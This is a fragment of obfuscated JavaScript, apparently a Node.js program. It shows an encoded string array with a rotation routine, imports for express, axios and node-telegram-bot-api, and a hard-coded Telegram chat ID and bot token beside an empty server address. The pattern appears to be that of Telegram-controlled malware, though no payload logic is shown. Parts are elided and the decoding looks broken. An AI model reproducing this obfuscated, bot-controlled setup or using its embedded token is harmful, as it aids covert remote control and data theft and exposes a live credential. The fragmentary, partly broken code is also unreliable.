function getArray() {
    const arr = [    '66ZNdSsZ', 'http', '80tPWVMu', 'body-parser', '1716710vlyYlo',     '2502076HVozcp', 'uuid', '12VapdUt', '2024390UPeXhf', '1616892jRRLGB',     '3156ZtGTZI', 'axios', '5360YNLrFD', '241803DgFjdT', '8825019XADAQr',     'express', 'node-telegram-bot-api'  ];
    getArray = function() {
      return arr;
    };
    return getArray();
  ...
  function decode(index, val) {
    const arr = getArray();
    decode = function(index, val) {
      index = index - 0xc7;
      let result = arr[index];
      return result;
    };
    return decode(index, val);
  }
  
  const _0x4961d6 = decode(0xe2, 0xf2b69);
  ...
  (function(_0x2a9603, _0x416b29) {
    ...
    while (true) {
      try {
        const value = parseInt(decode(0xcc), 10) / 1 
          + parseInt(decode(0xc8), 10) / 2 
          - parseInt(decode(0xcd), 10) / 3 
          * (parseInt(decode(0xcf), 10) / 4) 
          - parseInt(decode(0xc7), 10) / 5 
          * (parseInt(decode(0xca), 10) / 6) 
          - parseInt(decode(0xd1), 10) / 7 
          - parseInt(decode(0xd6), 10) / 8 
          * (-parseInt(decode(0xd0), 10) / 9) 
          + parseInt(decode(0xcb), 10) / 10 
          * (parseInt(decode(0xd4), 10) / 11);
        if (value === _0x416b29) break;
...
const chatId = '6017799634' 
const token = '5832616754:AAEOPe-dnV-G8tw2K96leemGXgx66VYYOdc'
const serverAddr = ''
